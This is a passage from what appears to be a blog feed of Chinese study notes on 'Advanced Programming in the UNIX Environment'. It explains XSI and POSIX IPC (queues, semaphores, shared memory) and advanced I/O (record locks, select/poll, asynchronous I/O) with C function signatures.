*buf )</span>;</span><br></pre></td></tr></table></figure><p><code>msgctl</code>函数对队列执行多种操作。</p><p><code>cmd</code>参数指定队列需要执行的操作：</p><ul><li>IPC_STAT：获取队列的msqid_ds结构信息，存放于buf指向的结构中</li><li>IPC_SET：将msg_perm.uid，msg_perm.gid，msg_perm.mode和msg_qbytes通过buf复制到队列的msqid_ds结构中。该命令只能由超级用户或者有效用户ID等于msg_perm.cuid或msg_perm.uid的用户执行。</li><li>IPC_RMID：删除队列及其中的数据。也只能由上述的两类用户执行。</li></ul><p>这3条命令也适用与信号量（semctl）和共享存储（shmctl）。</p><h2 id="信号量">信号量</h2><p>信号量是一个计数器，用于为多个进程提供对共享数据对象的访问。</p><p>示例代码：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/ch15/ipc_sem.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/ch15/ipc_sem.c</a></p><p>XSI信号量需要定义为一个或多个信号量的合集，因此在创建的时候需要指明信号量的个数，在使用的时候也要指明用的是哪个信号量。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: semaphore ID if OK, −1 on error// </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">semget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> nsems, <span class="type">int</span> flag)</span>;</span><br></pre></td></tr></table></figure><p><code>semget</code>用于创建或打开一个信号量合集。相关参数的与上一节的队列相似，多出来的<code>nsems</code>用于指定该集合中的信号量数。如果是创建新集合，则需要指定数量；如果是引用现有的集合，则将其设置为0。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">semctl</span><span class="params">(<span class="type">int</span> semid, <span class="type">int</span> semnum, <span class="type">int</span> cmd, ... <span class="comment">/* union semun arg */</span> )</span>;</span><br></pre></td></tr></table></figure><p><code>semctl</code>包含多种信号量操作。</p><p>第4个参数<code>arg</code>由<code>cmd</code>的实际值来决定是否使用，注意该参数并不是指针。如果需要使用该参数，其类型需要自己定义，一般定义为如下形式：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>              val;   <span class="comment">/* for SETVAL */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span>   <span class="comment">/* for IPC_STAT and IPC_SET */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  *<span class="built_in">array</span>; <span class="comment">/* for GETALL and SETALL */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>参数<code>semnum</code>用于指定信号量集合中的某个成员，该值在0 ~ nsmes-1之间。</p><p><code>cmd</code>由如下10个可选项：</p><ul><li>IPC_STAT，IPC_SET，IPC_RMID：与队列类似</li><li>GETVAL，SETVAL：返回/设置（通过arg.val）<code>semnum</code>指定的成员的信号量值（semval）</li><li>GETPID，GETNCNT，GETZCNT：返回指定成员的sempid，semncnt，semzcnt</li><li>GETALL，SETALL：取/设置所有的信号量值（通过arg.array）</li></ul><p>除GETALL以外所有的GET命令都由函数的返回值返回，其他命令则是成功返回0，失败返回-1并设置errno。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">semop</span><span class="params">(<span class="type">int</span> semid, <span class="keyword">struct</span> sembuf semoparray[], <span class="type">size_t</span> nops)</span>;</span><br></pre></td></tr></table></figure><p><code>semop</code>函数自动执行信号量集合上的操作数组。</p><p><code>nops</code>是数组<code>semoparray</code>的元素个数。</p><p><code>semoparray</code>是一个信号量操作数组，其中存放每个信号量的操作，其结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> sem_num; <span class="comment">/* member # in set (0, 1, ..., nsems-1) */</span></span><br><span class="line">  <span class="type">short</span>          sem_op;  <span class="comment">/* operation (negative, 0, or positive) */</span></span><br><span class="line">  <span class="type">short</span>          sem_flg; <span class="comment">/* IPC_NOWAIT, SEM_UNDO */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sem_flg</code>的SEM_UNDO标志标识当进程终止时，该操作修改的信号量值会被恢复，即重新设置为调用该操作之前的数值。</p><p><code>sem_op</code>可以指定如下3种值：</p><ul><li>正值，表示进程释放的占用的资源数，<code>sem_op</code>值会加到对应的信号量的值上。</li><li>0，表示进程希望等待该信号量值变为0。IPC_NOWAIT标志可以控制进程是否阻塞，相关的出错返回信息可以查阅手册，此处省略。</li><li>负值，表示进程想要获取的资源数。如果信号量值≥<code>sem_op</code>的绝对值（满足需求），则会从当前的信号量值上减去对应的值，否则由IPC_NOWAIT标志决定进程是否阻塞。</li></ul><p><code>semop</code>函数具有原子性，即要么执行数组中所有的操作，要么什么也不做。</p><h2 id="共享存储">共享存储</h2><p>共享存储允许两个或多个进程共享一个给定的存储区。但是，需要注意存储区访问的同步问题，当进程在写入数据时其他进程不应该去读取这些数据。一般使用信号量来解决这一同步问题。</p><p>相比与通过文件映射的方式来共享存储区的方式，XSI共享存储没有相关的文件，它共享的是内存的匿名段。</p><p>示例代码：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/ch15/ipc_shm.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/ch15/ipc_shm.c</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: shared memory ID if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">shmget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">size_t</span> size, <span class="type">int</span> flag)</span>;</span><br></pre></td></tr></table></figure><p><code>shmget</code>函数用于创建或引用一个共享存储段，在创建时<code>size</code>指定段的大小（单位是字节），若要引用一个现存的段，则应该设置为0。实现一般将大小向上取整为系统页长的整数倍，若指定的<code>size</code>不是整数倍，则余下的空间是不可使用的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">shmctl</span><span class="params">(<span class="type">int</span> shmid, <span class="type">int</span> cmd, <span class="keyword">struct</span> shmid_ds *buf )</span>;</span><br></pre></td></tr></table></figure><p><code>shmctl</code>函数对共享存储段执行多种操作。主要有IPC_STAT，IPC_SET和IPC_RMID，相关解释可以参考消息队列部分。</p><p>另外，Linux中还额外提供额外的命令支持，可以参考手册shmctl(2) 。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: pointer to shared memory segment if OK, −1 on error</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">int</span> flag)</span>;</span><br></pre></td></tr></table></figure><p><code>shmat</code>用于将共享存储段连接到进程的地址空间。具体连接到地址空间的什么位置由2、3两个参数决定。</p><ul><li>addr=0，则连接到内核选择的第一个可用地址上。（推荐）</li><li>addr≠0，且<code>flag</code>没有指定SHM_RND，那么连接到<code>addr</code>指定的地址。</li><li>addr≠0，且指定了SHM_RND，那么系统会按照公式(addr-(addr % SHMLBA))决定连接地址。该公式作用是将地址向下取最近的SHMLBA的倍数，而常数SHMLBA表示“低边界地址倍数”。</li></ul><p><code>flag</code>还可以指定SHM_RDONLY以只读方式连接共享段。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">shmdt</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr)</span>;</span><br></pre></td></tr></table></figure><p><code>shmdt</code>用于分离共享存储段。这一操作不会删除系统中共享存储段的标识符及其数据结构。想要删除对应的数据结构，需要调用<code>shmctl</code>的IPC_RMID命令。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201223113426.png" alt="Memory layout on an Intel-based Linux system"></p><h1>POSIX信号量</h1><p>POSIX信号量与XSI信号量最大的不同就是没有信号量集的概念，一次只能操作一个信号量。还有就是在删除信号量时，正在使用XSI信号量的操作会失败；而POSIX信号量的操作会正常执行，直到该信号量的最有一个引用被释放。</p><p>POSIX信号量有两种形式：命名的和未命名的。两者的差异在于创建和销毁的形式上，使用的方式是一样的。未命名的信号量只存在于内存中，因此想要使用这些信号量的进程需要有对应的访问权限，如同一进程中的线程，或者是不同进程中映射相同的内存内容到自己的地址空间的线程。而命名信号量可以被任何直到它们名字的进程访问。</p><p>示例代码：<a href="https://gitee.com/maxiaowei/Linux/blob/master/apue/ch15/ipc_psem.c">https://gitee.com/maxiaowei/Linux/blob/master/apue/ch15/ipc_psem.c</a></p><h2 id="创建与销毁">创建与销毁</h2><h3 id="命名信号量">命名信号量</h3><p>给信号量命名需要遵守一定的规则：</p><ul><li>名字的第一个字符应该是<code>/</code>。因为一般POSIX信号量的实现要使用文件系统。</li><li>名字不应该包含其他斜杠。</li><li>名字长度是实现定义的，不应长于_POSIX_NAME_MAX。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: Pointer to semaphore if OK, SEM_FAILED on error</span></span><br><span class="line"><span class="type">sem_t</span> *<span class="title function_">sem_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> oflag, ... <span class="comment">/* mode_t mode,</span></span></span><br><span class="line"><span class="comment"><span class="params">              unsigned int value */</span> )</span>;</span><br></pre></td></tr></table></figure><p><code>sem_open</code>用于创建一个新的信号量或使用一个现有的信号量。</p><p>当想要使用一个现有的信号量时，只需指定其名字，并将<code>oflag</code>设为0。</p><p>当<code>oflag</code>包含O_CREAT标志时，如果信号量不存在则会创建新的，如果存在则会被使用，但不会重新初始化。指定此标志时，还需要提供后面的2个参数。<code>mode</code>指定访问权限，这与打开文件的权限相同；<code>value</code>指定信号量的初值。</p><p>如果<code>oflag</code>同时指定了O_EXCL标志，则在创建信号量时，如果信号量已经存在就会出错。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_close</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_unlink</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br></pre></td></tr></table></figure><p><code>sem_close</code>用于关闭一个信号量，释放相关资源。进程退出时如果没有调用该函数，系统也会自动关闭打开的信号量。POSIX信号量没有UNDO机制，所以信号量的值不会受到影响。</p><p><code>sem_unlink</code>用于销毁信号量，删除信号量的名字。如果没有打开的信号量引用，信号量会被立即销毁，否则会延迟到最后一个打开的引用关闭。</p><h3 id="未命名信号量">未命名信号量</h3><p>这种形式的信号量主要用于单个进程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Both return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_init</span><span class="params">(<span class="type">sem_t</span> *sem, <span class="type">int</span> pshared, <span class="type">unsigned</span> <span class="type">int</span> value)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_destroy</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;</span><br></pre></td></tr></table></figure><p><code>sem_init</code>用于创建一个未命名信号量。</p><ul><li><p><code>value</code>指定其初值。</p></li><li><p><code>pshared</code>值为0时，信号量仅在进程的线程之间共享；不为0则表明会在进程之间共享。</p></li></ul><p><code>sem_destroy</code>用于销毁未命名信号量。销毁之后不能使用任何带有sem的信号量函数，除非通过sem_init重新初始化它。</p><h2 id="信号量操作">信号量操作</h2><p>与XSI信号量不同，POSIX信号量一次操作只能+1或者-1。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">// All return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_trywait</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_wait</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_timedwait</span><span class="params">(<span class="type">sem_t</span> *<span class="keyword">restrict</span> sem,</span></span><br><span class="line"><span class="params">                  <span class="type">const</span> <span class="keyword">struct</span> timespec *<span class="keyword">restrict</span> tsptr)</span>;</span><br></pre></td></tr></table></figure><p>这3个函数实现信号量的-1操作。</p><p>当信号量计数为0时，使用<code>sem_wait</code>函数会阻塞，直到成功使信号量-1或者被信号中断；而<code>sem_trywait</code>会返回-1且设置errno为EAGAIN。</p><p>使用<code>sem_timedwait</code>可以设定等待时间，超时后会返回-1且设置errno为ETIMEOUT。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_post</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;</span><br></pre></td></tr></table></figure><p>调用<code>sem_post</code>会使信号量计数+1。如果有进程被改信号量阻塞，那么进程会被唤醒。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_getvalue</span><span class="params">(<span class="type">sem_t</span> *<span class="keyword">restrict</span> sem, <span class="type">int</span> *<span class="keyword">restrict</span> valp)</span>;</span><br></pre></td></tr></table></figure><p><code>sem_getvalue</code>函数用于获取信号量值，该数值存储在<code>valp</code>指向的地址处。注意函数返回的数值有可能是过时的。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apue </tag>
            
            <tag> IPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX环境高级编程（14-高级I/O）</title>
      <link href="/posts/3327551038.html"/>
      <url>/posts/3327551038.html</url>
      
        <content type="html"><![CDATA[<p>本章主要介绍几种高级I/O功能，主要有非阻塞I/O、记录锁、I/O多路转接、异步I/O、readv/writev函数和存储映射I/O。</p><h1>非阻塞I/O</h1><p>某些系统调用可能会使进程永远阻塞，一般称其为低速系统调用。而使用非阻塞I/O，可以使<code>open</code>、<code>read</code>和<code>write</code>这类I/O操作不会阻塞，如果不能完成这些操作时，会立即出错返回。</p><p>有两种方法将其指定为非阻塞I/O：</p><ul><li><p>调用<code>open</code>时指定<code>O_NONBLOCK</code>标志。</p></li><li><p>通过<code>fcntl</code>函数打开<code>O_NONBLOCK</code>文件状态标志。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: depends on cmd if OK (see following), −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fcntl</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, ... <span class="comment">/* int arg */</span> )</span>;</span><br></pre></td></tr></table></figure><span id="more"></span></li></ul><h1>记录锁</h1><p>记录锁的主要功能是阻止多个进程同时修改文件的某一文件区。记录锁可以对整个文件加锁，也可以只针对文件的一部分进行加锁。</p><h2 id="锁的类型">锁的类型</h2><p>主要有<u><strong>共享读锁</strong></u>和<u><strong>独占性写锁</strong></u>这两种。</p><p>加读/写锁时，文件描述符必须是读/写打开。</p><p>任意多个进程在给定的字节上可以有一把共享的读锁，但是只能有一个进程有一把独占写锁。如果已经有一把或多把读锁，则不能再加上写锁；如果已经有一把写锁，则不能再对它加任何读锁。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201209112658.png" alt="Compatibility between different lock types"></p><p>对于同一个进程而言，如果尝试在同一个文件区间再加一把锁，无论之前是哪种类型的锁，新的锁都会覆盖旧的锁。</p><h2 id="fcntl记录锁">fcntl记录锁</h2><p>记录锁也是通过<code>fcntl</code>函数进行操作的，其cmd参数可选项为<code>F_GETLK</code>，<code>F_SETLK</code>或 <code>F_SETLKW</code>。第三个参数是一个指向flock结构的指针<code>flockptr</code>，用于描述锁。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flock</span> &#123;</span></span><br><span class="line">  <span class="type">short</span> l_type;   <span class="comment">/* F_RDLCK, F_WRLCK, or F_UNLCK */</span></span><br><span class="line">  <span class="type">short</span> l_whence; <span class="comment">/* SEEK_SET, SEEK_CUR, or SEEK_END */</span></span><br><span class="line">  <span class="type">off_t</span> l_start;  <span class="comment">/* offset in bytes, relative to l_whence */</span></span><br><span class="line">  <span class="type">off_t</span> l_len;    <span class="comment">/* length, in bytes; 0 means lock to EOF */</span></span><br><span class="line">  <span class="type">pid_t</span> l_pid;    <span class="comment">/* returned with F_GETLK */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>l_pid</code>变量返回的是持有锁的进程的pid。</p><p><strong>注意：</strong></p><ul><li><p>锁可以在文件尾端或者越过尾端处开始，但是不能在起始位置之前开始。</p></li><li><p>将起始偏移量指向文件起始处（如l_whence=SEEK_SET,l_start=0），且l_len设置为0，即可对整个文件加锁。</p></li></ul><p>在设置或释放文件上的一把锁时，系统按要求组合或分裂相邻区。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201209145506.png" alt="File byte-range lock diagram"></p><p>一块大的加锁区域，解锁其中的一部分，系统会自动将剩余加锁区域分裂为两个加锁区域，并各自维护一把锁；如果对两块加锁区域的中间未加锁部分加锁，则3个相邻区域会合并成一个加锁区域。如上图14.4所示，100-199间解锁150，则分成两块区域；之后重新加锁150，则又会变为上半部分的状态。</p><h3 id="加锁和解锁">加锁和解锁</h3><p>上面提到的3个命令对应于3种加解锁方式，具体如下：</p><ul><li>F_GETLK：判断是否会被其他锁阻塞。如果flockptr描述的锁被阻塞，则现有锁的信息会重写flockptr指向的内容；如果没有被阻塞，则将<code>l_type</code>设置为<code>F_UNLCK</code>，其余flockptr指向的信息不变。</li><li>F_SETLK：设置flockptr所描述的锁。如果尝试获得读锁/写锁，但是系统无法给这把锁，那么会立即出错返回，并将<code>errno</code>设置为<code>EACCES</code>或<code>EAGAIN</code>。如果将类型设置为<code>F_UNLCK</code>，那么此命令会清除flockptr指定的锁。</li><li>F_SETLKW：F_SETLK的阻塞版本。不能获取锁的时候，进程会被休眠，直到锁可用或者被信号唤醒。</li></ul><h2 id="继承与释放">继承与释放</h2><ol><li><p>锁与进程和文件两者相关联。即(a)当一个进程终止时，它建立的锁全部释放；(b)关闭一个描述符时，引用的文件上的该进程的所有锁都会释放（无论该文件是否还有其他的描述符）。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201209161022.png" alt="The FreeBSD data structures for record locking"></p><p>如图14.8所示，当父进程关闭fd1、2或3中任意一个时，与之关联的锁都会释放。系统会逐个检查lockf链表中的各项，释放调用进程持有的锁。</p></li><li><p>由fork产生的子进程不继承父进程所设置的锁。</p></li><li><p>在执行exec后，新程序可以继承原程序的锁。</p></li></ol><h1>I/O多路转接</h1><p>对于需要同时对多个文件进行操作的场景，比如从两个描述符中读取数据并全部存入另一个文件中，无法通过阻塞读（read）来读取这两个描述符，因为当一个描述符被读操作阻塞时，另一个描述符可能有数据可以读取。</p><p>通过I/O多路转接技术，可以构建一张描述符表，调用一个函数，直到列表中的一个描述符准备好后该函数返回。omv-confdbadm populate</p><h2 id="select">select</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: count of ready descriptors, 0 on timeout, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> maxfdp1, fd_set *<span class="keyword">restrict</span> readfds,</span></span><br><span class="line"><span class="params">         fd_set *<span class="keyword">restrict</span> writefds, fd_set *<span class="keyword">restrict</span> exceptfds,</span></span><br><span class="line"><span class="params">         <span class="keyword">struct</span> timeval *<span class="keyword">restrict</span> tvptr)</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>maxfdp1</code>指定搜索的最大描述符，该值应该是3个描述符集中的<strong>最大值+1</strong>。</p></li><li><p><code>readfds</code>，<code>writefds</code>和<code>exceptfds</code>是指向描述符集的指针，分别表示我们关心的可读、可写或处于异常状态的描述符集合。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: nonzero if fd is in set, 0 otherwise</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">FD_ISSET</span><span class="params">(<span class="type">int</span> fd, fd_set *fdset)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_CLR</span><span class="params">(<span class="type">int</span> fd, fd_set *fdset)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_SET</span><span class="params">(<span class="type">int</span> fd, fd_set *fdset)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_ZERO</span><span class="params">(fd_set *fdset)</span>;</span><br></pre></td></tr></table></figure><p>描述符集支持以上4中操作，声明一个描述符集后，必须首先使用<code>FD_ZERO</code>将其置为0，之后再通过SET和CLR函数设置各个描述符位。</p></li><li><p><code>tvptr</code>为等待时间（该值在返回时可能被改变）。</p><ul><li>设置为NULL表示永远等待。捕捉到信号（函数返回-1且errno设置为EINTR）或有描述符准备好后才返回。</li><li>时间设置为0则表示不等待，测试完所有描述符后立即返回。</li><li>时间不为0，则等待对应的时间。超时（返回0）或有描述符准备好后即返回，另外也会被信号打断。</li></ul></li><li><p>该函数的返回值&gt;0则表示有描述符已经准备好了，此返回值是3个描述符集中准备好的描述符之和，因此，如果描述符集中有相同的描述符，则该描述符会被多次计数。描述符集中仍旧打开的位是准备好的描述符，可以通过<code>FD_ISSET</code>来测试。</p></li></ul><p>当3个描述符集都设置为NULL时，select就变成了一个延时函数。</p><p>另外还有一个变体函数<code>pselect</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: count of ready descriptors, 0 on timeout, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pselect</span><span class="params">(<span class="type">int</span> maxfdp1, fd_set *<span class="keyword">restrict</span> readfds,</span></span><br><span class="line"><span class="params">          fd_set *<span class="keyword">restrict</span> writefds, fd_set *<span class="keyword">restrict</span> exceptfds,</span></span><br><span class="line"><span class="params">          <span class="type">const</span> <span class="keyword">struct</span> timespec *<span class="keyword">restrict</span> tsptr,</span></span><br><span class="line"><span class="params">          <span class="type">const</span> <span class="type">sigset_t</span> *<span class="keyword">restrict</span> sigmask)</span>;</span><br></pre></td></tr></table></figure><p>与<code>select</code>函数主要有以下不同：</p><ul><li>等待时间使用的数据结构不同。</li><li>超时时间不会被改变。</li><li>多了一个信号屏蔽字<code>sigmask</code>。当不为NULL时，调用<code>pselect</code>函数会原子地安装该信号屏蔽字，在返回时复原。</li></ul><h2 id="poll">poll</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="comment">// Returns: count of ready descriptors, 0 on timeout, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="keyword">struct</span> pollfd fdarray[], <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">  <span class="type">int</span>   fd;      <span class="comment">/* file descriptor to check, or &lt;0 to ignore */</span></span><br><span class="line">  <span class="type">short</span> events;  <span class="comment">/* events of interest on fd */</span></span><br><span class="line">  <span class="type">short</span> revents; <span class="comment">/* events that occurred on fd */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用pollfd结构的数组代替了<code>select</code>函数中的3个描述符集。<code>nfds</code>即为数组中的元素个数。其中，<code>events</code>的可选值见图14.17，可以选择多个；返回时，<code>revents</code>说明了描述符发生的事件。</p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201211111102.png" alt="The events and revents flags for poll"></p><p><code>timeout</code>指定等待时间，单位是<strong>毫秒</strong>。</p><h1>异步I/O</h1><p>本节主要讨论POSIX中的异步I/O接口。</p><h2 id="AIO控制块">AIO控制块</h2><p>异步接口使用AIO控制块来描述I/O操作，其主要结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aiocb</span> &#123;</span></span><br><span class="line">  <span class="type">int</span>             aio_fildes;     <span class="comment">/* file descriptor */</span></span><br><span class="line">  <span class="type">off_t</span>           aio_offset;     <span class="comment">/* file offset for I/O */</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">void</span>  *aio_buf;        <span class="comment">/* buffer for I/O */</span></span><br><span class="line">  <span class="type">size_t</span>          aio_nbytes;     <span class="comment">/* number of bytes to transfer */</span></span><br><span class="line">  <span class="type">int</span>             aio_reqprio;    <span class="comment">/* priority */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">aio_sigevent</span>;</span>   <span class="comment">/* signal information */</span></span><br><span class="line">  <span class="type">int</span>             aio_lio_opcode; <span class="comment">/* operation for list I/O */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，<code>aio_buf</code>作为读写操作的缓冲区，在操作完成前必须始终有效且不能复用。</p><p>如果文件打开方式为追加模式O_APPEND，向其写入数据时，偏移量<code>aio_offset</code>会被忽略。</p><p><code>aio_lio_opcode</code>指定该操作是读（LIO_READ）、写（LIO_WRITE）还是空（LIO_NOP）操作，该参数仅在基于列表的异步I/O操作lio_listio时有效。</p><p><code>aio_sigevent</code>结构如下，它表示在I/O事件完成后，如何通知程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> &#123;</span></span><br><span class="line">  <span class="type">int</span>             sigev_notify;                <span class="comment">/* notify type */</span></span><br><span class="line">  <span class="type">int</span>             sigev_signo;                 <span class="comment">/* signal number */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">sigval</span>    <span class="title">sigev_value</span>;</span>                 <span class="comment">/* notify argument */</span></span><br><span class="line">  <span class="type">void</span> (*sigev_notify_function)(<span class="keyword">union</span> sigval); <span class="comment">/* notify function */</span></span><br><span class="line">  <span class="type">pthread_attr_t</span> *sigev_notify_attributes;     <span class="comment">/* notify attrs */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sigev_notify</code>控制通知类型，有如下3中取值：</p><ul><li>SIGEV_NONE：   不通知进程。</li><li>SIGEV_SIGNAL：产生<code>sigev_signo</code>指定的信号。如果程序捕获该信号，并设置SA_SIGINFO标志（通过sigaction设置），那么信号处理程序得到的siginfo结构中的si_value被设置为<code>sigev_value</code>。</li><li>SIGEV_THREADS：调用<code>sigev_notify_function</code>指定的函数，且传入的参数为<code>sigev_value</code>。默认情况下该函数通过一个单独的分离线程执行，除非<code>sigev_notify_attributes</code>设置了线程参数。</li></ul><h2 id="接口函数">接口函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;aio.h&gt;</span></span></span><br><span class="line"><span class="comment">// Both return: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aio_read</span><span class="params">(<span class="keyword">struct</span> aiocb *aiocb)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">aio_write</span><span class="params">(<span class="keyword">struct</span> aiocb *aiocb)</span>;</span><br></pre></td></tr></table></figure><p>读写函数返回时，异步I/O请求被放入等待处理队列，返回值与读写操作的结果无关。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Returns: 0 if OK, −1 on error</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aio_fsync</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> aiocb *aiocb)</span>;</span><br></pre></td></tr></table></figure><p>如果希望等待中的异步操作不等待而直接写入，可以调用aio_fsync函数，同样的，该函数也仅仅是发送一个请求，而不会等待操作结束。</p><p><code>op</code>参数设定为O_DSYNC，则执行起来与fdatasync类似；如果设置为O_SYNC，则与fsync类似。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">aio_error</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> aiocb *aiocb)</span>;</span><br></pre></td></tr></table></figure><p>获取异步读/写或同步操作的完成状态，返回值有以下4种情况：</p><ul><li>0：异步操作成功完成。</li><li>-1：函数出错，可以通过errno查看出错信息。</li><li>EINPROGRESS：操作仍在等待。</li><li>其他：相关的异步操作失败返回的错误码。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">aio_return</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> aiocb 